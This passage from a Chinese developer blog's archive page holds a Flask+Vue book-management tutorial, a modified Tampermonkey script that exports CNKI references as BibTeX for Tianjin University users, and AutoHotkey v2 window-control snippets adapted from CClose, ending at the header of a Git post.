<p>本文章源代码（附于文末）是经由 <a href="https://www.bilibili.com/video/BV1Jr4y1771i">Bilibili视频</a> 手敲而来，再经过实际情况做了小的改良（使用 MySQL 数据库），是视频教程内容的源码部分的补充，强烈建议配合视频食用。</p>
<p>当然有一定相关知识基础，但不愿意看视频的，可以<strong>直接理解源码，读代码注解</strong>即可。</p>
</blockquote>
<p>不管你做过多少的项目，<strong>图书管理系统</strong>你总该做过吧？</p>
<blockquote>
<p><em>面试官：你是我见过的第 XXX 个做图书管理系统的。</em></p>
</blockquote>
<p>像这种不大不小的前后端开发项目，是最适合个人学习新技术的。这篇文章分享一个极简图书管理系统的前后端开发项目源码学习实践，帮助你快速熟悉 Flask+Vue 前后端分离的开发流程。适合基本了解 Vue 与 Flask 基本功能，但想进行前后端交互实践的学习者，动手体验自己造一个小项目。</p>
<p>前置知识：</p>
<ul>
<li>Python 基础，懂 python 基本的语法</li>
<li>一点点 HTML+CSS+Javascript+AJAX 基础，不需要特别深入</li>
<li>Vue 基础，这里推荐做完互动教程（API 风格：组合式）就行：<a href="https://cn.vuejs.org/tutorial/#step-1">教程 | Vue.js (vuejs.org)</a></li>
<li>Flask 基础，推荐一边做一边查阅：<a href="https://tutorial.helloflask.com/">Flask 入门教程 (helloflask.com)</a></li>
<li>MySQL 基础（非必需）</li>
</ul>
<h1>功能展示</h1>
<p>基本页面：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230504170537219.png" alt="image-20230504170537219"></p>
<p>实现了图书管理系统增删改查功能。</p>
<h1>环境与依赖</h1>
<p>环境：Python 3.10</p>
<p>后端：</p>
<ul>
<li>Python 安装 Flask</li>
<li>pip 安装 Flask-Cors、Flask-Cors、PyMySQL</li>
</ul>
<p>前端：Vite、Vue、axios、element-plus</p>
<h1>案例代码使用</h1>
<h2>后端</h2>
<p>创建好 Flask 项目后，把以下文件放入项目文件夹中即可</p>
<pre><code class="language-test">后端项目
│  .env         # python-dotenv 相关
│  .flaskenv    # python-dotenv 相关
│  app.py       # flask主程序
│  demo.http    # HTTP请求测试文件
│  extension.py # 扩展
│  models.py    # 数据库
</code></pre>
<p>你在 PyCharm 看到的应该是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230504174717777.png" alt="image-20230504174717777"></p>
<p>通过以下命令启动后端服务器:</p>
<pre><code class="language-sh">flask run
# 或
python app.py
</code></pre>
<h2>前端</h2>
<p>通过 Vite 创建 Vue 项目后，把/src/assets/main.css 中的内容注释掉，免得后面网页显示异常。</p>
<p>用本案例的两个文件替换原项目的对应文件：</p>
<pre><code>App.vue
main.js
</code></pre>
<p>你在 VSCode 看到的应该是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230504175239052.png" alt="image-20230504175239052"></p>
<p>通过以下命令启动客户端：</p>
<pre><code class="language-sh">npm run dev
</code></pre>
<h1>问题解决记录</h1>
<p>这个板块记录我在参照视频敲代码所遇到的问题。在我提供的代码中，这些问题已被解决。</p>
<p><strong>Q: 我使用的数据库是 mysql</strong></p>
<p>A: 安装 PyMySQL Python 包之后，app.config 可以这样写：</p>
<pre><code class="language-python">app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:&lt;your mysql key&gt;@localhost:3306/&lt;your database name&gt;?charset=utf8mb4'
</code></pre>
<p>改变上述代码中的：</p>
<ul>
<li>&lt;your mysql key&gt;：你的 Mysql 数据库密码</li>
<li>&lt;your database name&gt;：你创建的数据库名，记得要预先创建好</li>
</ul>
<p><strong>Q: js 中模板字符串 <code>${var}</code> 无效</strong></p>
<p>A: 注意，字符串用`来括住，不是单引号，不是双引号。</p>
<p>参考：<a href="https://bbs.csdn.net/topics/392194597">ES6 模板字符串 ${} 无效-CSDN社区</a></p>
<p><strong>Q: 出现跨域问题</strong></p>
<p>A: 代码里已经解决了跨域问题，请检查请求的 URL 是否正确</p>
<p>参考：<a href="https://zhuanlan.zhihu.com/p/75738155">flask restful 处理跨域请求 - 知乎 (zhihu.com)</a></p>
<p><strong>Q: 希望服务端的响应报文返回中文而不是 Unicode 字符串</strong></p>
<p>A: 对服务端的返回结果进行处理，如：</p>
<pre><code class="language-python">ret= { '''your data''' }
return json.dumps(ret, ensure_ascii=False)
</code></pre>
<p>注意，由于 Flask 版本更新，为 Flask app 设置变量 <code>JSON_AS_ASCII</code> 的方法已经失效。</p>
<p>参考：</p>
<ul>
<li>[flask 或 flask-restful 的接口开发，返回的 json 数据能显示中文的方法 _flask 设置 json 数据显示中文格式 _fj_changing 的博客 -CSDN 博客](<a href="https://blog.csdn.net/fj_changing/article/details/116385130#:~:text=%E7%94%A8,flask">https://blog.csdn.net/fj_changing/article/details/116385130#:~:text=用,flask</a> 或 flask-restful 开发接口时，返回给前端的 json 数据中若有中文，在 postman 的 raw 里或浏览器直接访问，中文会显示成 unicode 编码之后的形式，下面是使之显示成中文的方法。)</li>
<li><a href="https://flask.palletsprojects.com/en/2.3.x/changes/?highlight=json_as_ascii">Changes — Flask Documentation (2.3.x) (palletsprojects.com)</a></li>
</ul>
<h1>额外收获</h1>
<p>用 HTTP 文件调试 API 的技能学习，参考这篇文章学会写 http 的测试请求：<a href="https://marketplace.visualstudio.com/items?itemName=humao.rest-client">REST Client - Visual Studio Marketplace</a></p>
<p>RESTful 风格 API：<a href="http://ruanyifeng.com/blog/2014/05/restful_api.html">RESTful API 设计指南 - 阮一峰的网络日志 (ruanyifeng.com)</a></p>
<h1>源代码</h1>
<p>链接：<a href="https://pan.baidu.com/s/1wvCntRDhUhzhxBe-Z6hdug?pwd=xzw6">https://pan.baidu.com/s/1wvCntRDhUhzhxBe-Z6hdug?pwd=xzw6</a></p>
<p>提取码：xzw6</p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2226004458" class="record">
            <header>
                <h1 class="record-title">魔改脚本实现知网导出 Bibtex 参考格式</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('BibTeX');">BibTeX</button>
                    
                    <button class="btn" onclick="activeTag('知网');">知网</button>
                    
                    <button class="btn" onclick="activeTag('Javascript');">Javascript</button>
                    
                    <button class="btn" onclick="activeTag('Tampermonkey');">Tampermonkey</button>
                    
                    <button class="btn" onclick="activeTag('Greasy Fork');">Greasy Fork</button>
                    
                    <button class="btn" onclick="activeTag('TJU');">TJU</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/11/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/bibtexzhiwangcover554fsd(1).png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>修改油叉脚本以适应当前访问知网的网络状况</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>84ae21ea</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>这篇文章的脚本已发布到 Greasy Fork（油叉）平台，你可以前往 <a href="https://greasyfork.org/zh-CN/scripts/466046-%E7%9F%A5%E7%BD%91-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE-bibtex-%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6">知网 参考文献 bibtex 天津大学 (greasyfork.org)</a> 进行下载安装。后续脚本更新将在该平台更新。20230511<br>
<img src="https://cdn.gallery.uuanqin.top/img/20230828235229.webp" alt="image.png"></p>
</blockquote>
<hr>
<p>最近不是开始写毕业论文了嘛，使用到 LaTeX 进行写作。其中，导入参考文献部分需要以 BibTeX 格式写进模板中。</p>
<p>Google Scholar 网站上存在兼容 BibTeX 的参考文献信息，但是知网里没有这种格式的导出，这时就可以借助脚本实现这个功能。</p>
<p>这里分享我的魔改推导步骤，不想看过程的直接复制后文源码（DIFF 文件，记得删前面的 +- 号）。</p>
<blockquote>
<p>[!warning] 注意<br>
本篇文章的实现过程适用于天津大学校内登录用户，代码并不具有普遍性。各位读者可以根据思路自行改动。</p>
</blockquote>
<h1>不借助脚本实现 Bibtex 参考文献生成及标注方法</h1>
<p>在介绍使用脚本方法之前先简要说明我之前的解决方案。</p>
<h2>使用谷歌学术进行参考文献生成</h2>
<p>通过以下几个步骤，可以轻松完成参考文献的生成。</p>
<ol>
<li>在谷歌学术搜索中，点击学术搜索设置。</li>
<li>页面打开之后，在文献管理软件选项中选择显示导入 BibTeX 的链接，单击保存设置，退出。</li>
<li>在谷歌学术搜索中检索到文献后，在文献条目区域单击导入 BibTeX 选项，页面中出现文献的引用信息。<br>
<img src="https://cdn.gallery.uuanqin.top/img/image-20230511164837738.png" alt="image-20230511164837738|500"></li>
</ol>
<p>格式是这样的：</p>
<pre><code class="language-tex">@article{刘娟2020基于,
  title={基于 Python 爬虫的职位信息数据分析和可视化系统实现},
  author={刘娟 and 管希东},
  journal={Software Engineering and Applications},
  volume={9},
  pages={317},
  year={2020},
  publisher={中文学术期刊, 汉斯出版社, Hans Publishers}
}
</code></pre>
<h2>转化知网 NoteExpress 文献导出格式</h2>
<p>知网没有直接导出 BibTeX 文献导出格式的功能，但是有一个格式跟它很像。</p>
<ol>
<li>
<p>在文章介绍页面点击导出参考文献</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511165242045.png" alt="image-20230511165242045|525"></p>
</li>
<li>
<p>选择“更多引用格式”</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511165317189.png" alt="image-20230511165317189|575"></p>
</li>
<li>
<p>选择 NoteExpress</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511165344333.png" alt="image-20230511165344333|500"></p>
</li>
</ol>
<p>对应着 BibTeX 的格式，你就可以自己写咯。</p>
<h1>脚本解决</h1>
<p>使用浏览器插件 Tampermonkey，在 Greasy Fork 中搜索脚本：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511165539516.png" alt="image-20230511165539516|500"></p>
<blockquote>
<p>读图片的介绍，知道该脚本的原理就是把知网 NodeExpress 格式进行转换，理解这一点方便我们进行后续的魔改</p>
</blockquote>
<p>安装后，在知网文章介绍页面中会多出按钮，点击后 BibTeX 格式的参考文献会自动复制到粘贴板中。如果你试过了没有问题，那么本篇文章到此结束。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511165810324.png" alt="|425"></p>
<p>由于我使用的是学校账号打开的知网，知网的网址与相关接口都不一样，这个脚本就不会起作用。那么接下来就是魔改时刻。</p>
<h2>魔改 1- 脚本需要匹配对应的网址</h2>
<p>这个脚本只有在特定的地址才发挥作用，不然你会看不到上文图中多出的按钮。</p>
<p>因为我的知网文章首页地址是这样的：</p>
<pre><code>https://&lt;一堆字符&gt;.eds.tju.edu.cn/kcms2/article/abstract&lt;后面省略参数&gt;
</code></pre>
<p>所以我就想办法增加这条规则：</p>
<pre><code>https://&lt;一堆字符&gt;.eds.tju.edu.cn/kcms2/article/abstract*
</code></pre>
<blockquote>
<p>添加的 URL 规则根据你的具体情况进行设计</p>
</blockquote>
<h3>方法 1：js 源代码修改</h3>
<p>在源代码中增加这一行规则，ctrl+s 保存即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511171357098.png" alt="image-20230511171357098|550"></p>
<h3>方法 2：设置页面增加设定</h3>
<p>打开 TamperMonkey 脚本管理界面，点击设置选项卡增加用户匹配：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511171717236.png" alt="image-20230511171717236|550"></p>
<p>保存后重新访问文章简介页试试看，出现 BibTex 按钮此部分就成功了。</p>
<h2>魔改 2- 使用正确的接口</h2>
<p>经过上一步后，虽然出现了按钮，但不起作用。打开控制台会出现报错信息：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511172003104.png" alt="image-20230511172003104|500"></p>
<p>看了一下脚本的源码，它发送的 POST 请求地址为：</p>
<pre><code>https://kns.cnki.net/kns8/manage/APIGetExport
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511170918257.png" alt="image-20230511170918257|525"></p>
<p>这里的接口地址我们可以改一下。之前我们提到脚本原理就是读取知网 NoteExpress 格式进行 BibTeX 的转换。这里我通过抓包，得到接口的地址：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230511172554301.png" alt="image-20230511172554301|550"></p>
<p>那么我们就可以把这串地址粗暴的写进去。（注意配合通配符使用）</p>
<h2>魔改 3- 使用正确的返回数据</h2>
<p>改对了 POST 请求发送的地址还不够，该脚本不能正确解析返回数据。</p>
<p>返回的数据是字符串：</p>
<pre><code>&lt;ul class='literature-list'&gt;
&lt;li&gt;
	{Reference Type}: Journal Article&lt;br&gt;
	{Title}: Flask框架在数据可视化的应用&lt;br&gt;
	{Author}: 陈嘉发;黄宇靖;&lt;br&gt;
	{Author Address}: 惠州卫生职业技术学院教育技术与信息中心;&lt;br&gt;
	{Journal}: 福建电脑&lt;br&gt;
	...
	{Database Provider}: CNKI&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;input id=&quot;traceid&quot; type=&quot;hidden&quot; value=&quot;cf4aca8f33f5471f9c383ebf93578d2f.227.16837969341201267&quot;&gt;
</code></pre>
<p>经过调试与源码推测我们需要的是 <code>&lt;li&gt;</code> 标签中的内容。</p>
<p>对应的正则表达式为：（附工具：<a href="https://c.runoob.com/front-end/854/">正则表达式在线测试 | 菜鸟工具 (runoob.com)</a>）</p>
<pre><code class="language-reg">/(?&lt;=&lt;li&gt;).*(?=&lt;/li&gt;)/g
</code></pre>
<p>对应的 js 语句（多了个转义符 <code>\</code>）：</p>
<pre><code class="language-js">var ss = data.match(/(?&lt;=&lt;li&gt;).*(?=&lt;\/li&gt;)/g)
</code></pre>
<p>一顿编辑源码与 BUG 修复就 OK 了（具体编辑看 DIFF 文件）！</p>
<p>使用效果：</p>
<pre><code class="language-tex">@article{cite_label,
   title={flask框架在数据可视化的应用},
   author={陈嘉发;黄宇靖;},
   authoraddress={惠州卫生职业技术学院教育技术与信息中心;},
   journal={福建电脑},
   year={2022},
   volume={38},
   number={12},
   pages={44-48},
   keywords={flask框架;python爬虫;数据可视化图表库},
   abstract={我就省略了，一大串的},
   isbn/issn={1673-2782},
   notes={35-1115/tp},
   doi={10.16707/j.cnki.fjpc.2022.12.009},
   databaseprovider={cnki},
}
</code></pre>
<blockquote>
<p>提一点，在我的模板中，cite_label 不能是中文，否则编译出错。我使用的是天津大学毕业论文模板：<a href="https://gitee.com/tju_embedded/tju_undergraduate_design">嵌入式软件工程实验室/天津大学本科毕业论文 Latex 模板 - 码云 - 开源中国 (gitee.com)</a></p>
</blockquote>
<h1>源码</h1>
<blockquote>
<p>此处不再更新，新版本请前往 Greasy Fork 平台进行下载安装。DIFF 文件进提供修改参考。</p>
</blockquote>
<p>diff 文件。把减号行删除，删除加号行的加号即可得目的源文件。</p>
<pre><code class="language-diff">// ==UserScript==
// @name         知网 参考文献 bibtex
// @namespace    https://github.com/HawkTom
// @require      https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js
// @version      1.1.1
// @description  从知网文献中直接复制bibtex
- // @author       Hao
+ // @author       Hao, uuanqin
// @match        https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=*
// @match        http://kns.cnki.net/kcms/detail/detail.aspx?dbcode=*
+ // @match        https://*.eds.tju.edu.cn/kcms2/article/abstract*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    jQuery(document).ready(function($) {

        window.onload = function(){

            var a = document.getElementById(&quot;paramdbname&quot;)
            var b = document.getElementById(&quot;paramfilename&quot;)
            var fileid = a.getAttribute(&quot;value&quot;) + '!' + b.getAttribute(&quot;value&quot;) +'!1!0'

            var x = document.getElementsByClassName(&quot;btn-tool&quot;)
            var input = document.createElement('li')
            input.setAttribute(&quot;id&quot;, &quot;bibbtn&quot;)
            input.setAttribute(&quot;class&quot;, &quot;btn-quote&quot;)
            //input.setAttribute(&quot;type&quot;, &quot;button&quot;)
            input.setAttribute(&quot;title&quot;, &quot;Bibtex&quot;)
            //input.setAttribute(&quot;onclick&quot;, &quot;func(this)&quot;) href=\&quot;javascript:void(0)\&quot; onclick=\&quot;getBib()\
            input.innerHTML = &quot;&lt;a&gt;&lt;i&gt;&lt;/i&gt;Bibtex&lt;/a&gt;&quot;
            x[0].children[0].append(input)

            $(&quot;#bibbtn&quot;).click(function(){
+           	var url = window.location.hostname; // 得到 *.eds.tju.edu.cn
-            	$.post(&quot;https://kns.cnki.net/kns8/manage/APIGetExport&quot;,
+               $.post(`https://${url}/kns8/manage/ShowExport`,
                {
                  filename:fileid,
                  displaymode:&quot;NoteExpress&quot;
                },
                function(data){
                    console.log(data);
                    var bibtext = &quot;&quot;
-                   var ss = data.data[0].value[0]
-                   var ssl = ss.split(&quot;&lt;br&gt;&quot;)
+                   var ss = data.match(/(?&lt;=&lt;li&gt;).*(?=&lt;\/li&gt;)/g) // .data[0].value[0]
+                   console.log(ss); // 输出调试而已
+                   var ssl = ss[0].split(&quot;&lt;br&gt;&quot;)
                    for (var i=0; i&lt;ssl.length-1; i++){
                        var k = ssl[i].toLocaleLowerCase().split(&quot; &quot;).join(&quot;&quot;).split(&quot;:&quot;)
                        var item = k[0]
                        var detail = k[1]
                        if (item == &quot;{referencetype}&quot;){
                            if (detail == &quot;journalarticle&quot;){
                                bibtext = &quot;@article{cite_label ,\n&quot;
                            }
                            else if(detail == &quot;conferenceproceedings&quot;){
                                bibtext = &quot;@inproceedings{cite_label ,\n&quot;
                            }
                        }
                        else if(item == &quot;{issue}&quot;){
-                           bibtext = bibtext + &quot;   {number}={&quot; + detail + &quot;},\n&quot;
+                           bibtext = bibtext + &quot;   number={&quot; + detail + &quot;},\n&quot; // 不明白这里的number为什么要括起来
                        }
                        else {
                            bibtext = bibtext + &quot;   &quot; + item.substr(1, item.length-2) + &quot;={&quot; + detail + &quot;},\n&quot;
                        }
                    }
                    bibtext += &quot;}&quot;
                    //console.log(bibtext)
                    const copad = document.createElement('textarea')
                    copad.value = bibtext
                    document.body.appendChild(copad)
                    copad.select()
                    document.execCommand('Copy')
                    document.body.removeChild(copad)
                });
            })
        };
    })
})();
</code></pre>
<h1>后记</h1>
<p>作者本人已顺利从天大毕业，相关校园网账号已封禁，因此无法再对此脚本进行测试与维护。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/fegxig1230/article/details/118458288">知网 BibTeX 自动生成（使用 BibTeX 引用中文参考文献）_奕小星的博客-CSDN 博客</a></li>
<li><a href="https://www.w3school.com.cn/js/js_string_search.asp">JavaScript 字符串搜索 (w3school.com.cn)</a></li>
<li><a href="https://c.runoob.com/front-end/854/">正则表达式在线测试 | 菜鸟工具 (runoob.com)</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-lookahead">正则表达式 - JavaScript | MDN (mozilla.org)</a></li>
<li><a href="https://blog.csdn.net/u013288800/article/details/82787641">使用 JS 获取当前页面的 URL(网址信息)_js 获取 url_Devere 的博客-CSDN 博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3273167773" class="record">
            <header>
                <h1 class="record-title">AHK 鼠标增强（CClose 源码撷英）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CClose');">CClose</button>
                    
                    <button class="btn" onclick="activeTag('快捷键');">快捷键</button>
                    
                    <button class="btn" onclick="activeTag('鼠标');">鼠标</button>
                    
                    <button class="btn" onclick="activeTag('AutoHotKey');">AutoHotKey</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/26/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/cclosecover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>提取CClose中有用的脚本代码进行解析</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>c318939d</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>刷抖音刷到一个项目，就是一个可以增加鼠标功能的操作。它为鼠标赋予了以下操作：</p>
<table>
<thead>
<tr>
<th>Action</th>
<th>+ Target</th>
<th>= Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>Middle click</td>
<td>+ title bar</td>
<td>= close window</td>
</tr>
<tr>
<td>Right click</td>
<td>+ title bar</td>
<td>= minimize window</td>
</tr>
<tr>
<td>Hold left click</td>
<td>+ title bar</td>
<td>= toggle window always on top</td>
</tr>
<tr>
<td>Double press</td>
<td>+ Esc key</td>
<td>= close active window</td>
</tr>
<tr>
<td>Right click</td>
<td>+ taskbar button</td>
<td>= move pointer to &quot;Close window&quot;</td>
</tr>
</tbody>
</table>
<p>软件不大，主要使用 AutoHotKey 脚本进行开发。鼠标快捷操作挺好用的，尤其是中键关闭窗口的操作，统一了浏览器关闭标签页的动作。但是我看中了其中的脚本语言 AutoHotKey，感觉它很有用处，遂决定剖析源码，提取其中执行快捷操作的有用脚本进行学习。</p>
<p>以下是原项目的地址：</p>
<blockquote>
<p><a href="https://github.com/chaohershi/cclose/tree/master">chaohershi/cclose: A Windows utility that helps you close windows faster or pin windows always on top. (github.com)</a></p>
</blockquote>
<p>原项目的 AutoHotKey 脚本语言版本应该是 V1，下面我将用 V2 版本进行改写并对其进行了简化 <s>（😥 其实是删去我看不懂但实际影响不大的内容）</s> 。读者可以摘取其中的片段作为自己的脚本。改进点：</p>
<ul>
<li>AutoHotKey 语法升级：从 V1 到 V2</li>
<li>启用部分快捷功能有提示</li>
</ul>
<p>解析开始 🔽</p>
<h1>公共函数部分</h1>
<pre><code class="language-c">#Requires AutoHotkey v2.0

; 检测鼠标是否在指定的WinTitle窗口中
MouseIsOver(WinTitle)
{
	MouseGetPos  , , &amp;win
	return WinExist(WinTitle &quot; ahk_id &quot; win)
}

; 检测鼠标是否悬停在标题
MouseIsOverTitlebar()
{
	CoordMode &quot;Mouse&quot;, &quot;Screen&quot;
	MouseGetPos &amp;x, &amp;y, &amp;win
    ; 用于存储目标窗口左上角的 X 和 Y 坐标的变量的引用
	WinGetPos &amp;xWin, &amp;yWin, , , &quot;ahk_id &quot; win

	if WinExist(&quot;ahk_class Shell_TrayWnd ahk_id &quot; win) || WinExist(&quot;ahk_class Shell_SecondaryTrayWnd ahk_id &quot; win) ; exclude the taskbar
	{
		return false
	}
	else if (y &gt;= yWin &amp;&amp; y &lt; yWin + 30 * A_ScreenDPI / 96)
    ; if within title bar width
	{
        return true
	}
    return false
}

; 展示1s钟的标签
ShowToolTip(msg)
{
    ToolTip msg,,0
    SetTimer () =&gt; ToolTip(), -1000
}
</code></pre>
<h1>第一部分 标题操作</h1>
<table>
<thead>
<tr>
<th>Action</th>
<th>+ Target</th>
<th>= Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>Middle click</td>
<td>+ title bar</td>
<td>= close window</td>
</tr>
<tr>
<td>Right click</td>
<td>+ title bar</td>
<td>= minimize window</td>
</tr>
<tr>
<td>Hold left click</td>
<td>+ title bar</td>
<td>= toggle window always on top</td>
</tr>
</tbody>
</table>
<pre><code class="language-C">#HotIf MouseIsOverTitlebar()
; 功能：鼠标中键点击标题关闭窗口
MButton::
{
    ; alternative to WinClose, as WinClose is a somewhat forceful method, e.g., if multiple Microsoft Excel instances exist, WinClose will close them all at once.
    ; 0x112 = WM_SYSCOMMAND, 0xF060 = SC_CLOSE https://autohotkey.com/docs/commands/WinClose.htm#Remarks
    ; https://learn.microsoft.com/zh-cn/windows/win32/menurc/wm-syscommand
    MouseGetPos  , , &amp;win         ; 我加的，要不然它不起作用
    PostMessage 0x112, 0xF060, , win
    ShowToolTip(&quot;窗口关闭&quot;)
}

; 功能：鼠标右键点击标题最小化窗口
RButton::
{
    err_code := KeyWait(&quot;RButton&quot;, &quot;T0.4&quot;)
    if(err_code = 0) ;超时
    {
        Send &quot;{Click, Right}&quot; ; n.b., do not use Send {RButton}
    }else{
        ; https://learn.microsoft.com/zh-cn/windows/win32/menurc/wm-syscommand
        MouseGetPos  , , &amp;win           ; 我加的，要不然它不起作用
        PostMessage 0x112, 0xF020, ,win ; alternative to WinMinimize
        ShowToolTip(&quot;窗口最小化&quot;)
    }
}

; 窗口置顶功能
~LButton::
{
    CoordMode &quot;Mouse&quot;, &quot;Screen&quot;
    MouseGetPos &amp;xOld, &amp;yOld, &amp;win
    ExStyle := WinGetExStyle(win)
    if (ExStyle &amp; 0x8) ; 0x8 is WS_EX_TOPMOST
    {
        ExStyle := &quot;窗口已取消置顶&quot;
    }
    else
    {
        ExStyle := &quot;窗口已置顶&quot;
    }
    err_code := KeyWait(&quot;LButton&quot;, &quot;T1&quot;) ; wait for the left mouse button to be released with timeout set to 1 second
    MouseGetPos &amp;xNew, &amp;yNew
    if (xOld = xNew &amp;&amp; yOld = yNew &amp;&amp; err_code = 0) ; if the mouse did not move during the timeout period
    {
        WinSetAlwaysOnTop -1, &quot;A&quot; ; toggle window always on top
        ShowToolTip(ExStyle)
    }
}
</code></pre>
<h1>第二部分 双击 Esc 关闭窗口</h1>
<table>
<thead>
<tr>
<th>Action</th>
<th>+ Target</th>
<th>= Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>Double press</td>
<td>+ Esc key</td>
<td>= close active window</td>
</tr>
</tbody>
</table>
<pre><code class="language-C">; 功能：双击Esc关闭窗口
#HotIf
~Esc::
{
    id_old := WinGetID(&quot;A&quot;)
    process_name := WinGetProcessName(&quot;A&quot;)
    KeyWait &quot;Esc&quot; ; wait for the Esc key to be released
    err_code := KeyWait(&quot;Esc&quot;, &quot;D T0.4&quot;)
    if (err_code = 1){
        id_new := WinGetID(&quot;A&quot;) ; get the window id after the Esc key has being pressed again
        win_class := WinGetClass(&quot;A&quot;)
        if (id_old = id_new &amp;&amp; win_class != &quot;Shell_TrayWnd&quot; &amp;&amp; win_class != &quot;Shell_SecondaryTrayWnd&quot; &amp;&amp; win_class != &quot;Progman&quot; &amp;&amp; win_class != &quot;WorkerW&quot;)
        {
            ; if the current window is the same one as before and is not taskbar or desktop
            Send &quot;!{F4}&quot;
        }
    }
}
</code></pre>
<h1>第三部分 右击任务栏</h1>
<table>
<thead>
<tr>
<th>Action</th>
<th>+ Target</th>
<th>= Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>Right click</td>
<td>+ taskbar button</td>
<td>= move pointer to &quot;Close window&quot;</td>
</tr>
</tbody>
</table>
<p>右击任务栏后，如果鼠标自动悬停在关闭窗口上：</p>
<pre><code class="language-C">; 功能，右击任务栏图标鼠标自动跳转到关闭窗口
#HotIf MouseIsOver(&quot;ahk_class Shell_TrayWnd&quot;) || MouseIsOver(&quot;ahk_class Shell_SecondaryTrayWnd&quot;) ; apply the following hotkey only when the mouse is over the taskbar
~RButton:: ; when right clicked
{
    CoordMode &quot;Mouse&quot;, &quot;Screen&quot;
    MouseGetPos &amp;xOld, &amp;yOld
    Sleep 500 ; wait for the Jump List to pop up, n.b., this line also helps to provide a uniform waiting experience
    MouseGetPos &amp;xNew, &amp;yNew
    CoordMode &quot;Mouse&quot;, &quot;Window&quot;
    if (Abs(xNew - xOld) &lt; 8 &amp;&amp; Abs(yNew - yOld) &lt; 8) ; if the mouse did not move much
    {
        Loop 6
        {
            if WinActive(&quot;ahk_class Windows.UI.Core.CoreWindow&quot;) ; if the Jump List pops up (right clicked on the taskbar app buttons)
            {
                WinGetPos , , &amp;width, &amp;height ; get the size of the last found window (Jump List)
                MouseMove (width / 2), (height - 3 * width / 32), 10 ; move the mouse to the bottom of the Jump List (&quot;Close window&quot;)
                break
            }
            Sleep 250 ; wait for more time
        }
    }
}
</code></pre>
<h1>总结</h1>
<p>上面的示例代码可以组成一个.ahk 文件，实现所有 CClose 的基本功能。</p>
<p>开机自启动方法：</p>
<ol>
<li>Win+R 打开运行窗口，输入 shell:startup</li>
<li>把脚本的快捷方式丢到里面即可</li>
</ol>
<p>未来可以改进的地方：</p>
<ul>
<li>[ ] 控制部分功能的启用与禁用（好的，又成 CClose 的轮子版了）</li>
<li>[ ] 进一步，对自己的脚本进行控制和管理</li>
<li>[ ] 对使用了管理员权限运行的系统无效</li>
<li>[ ] 状态栏图标改一下</li>
<li>[ ] 学习制作一个 Windows 软件</li>
</ul>
<p>目前存在的问题：</p>
<ul>
<li>[ ] 在运行《荒野大镖客 2》时部分情况下会触发。估计全屏游戏都会出现这个问题，待修复和改进。</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1886753501" class="record">
            <header>
                <h1 class="record-title">Git基本操作学习</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Git');">Git</button>
                    
                    <button class="btn" onclick="activeTag('GitHub');">GitHub</button>
                    
                    <button class="btn" onclick="activeTag('Gitee');">Gitee</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/27/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/git-basic-cover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>包含初学者学习内容与进阶方法论</span>
                </div>
                
                <div class="record-abbrlink">
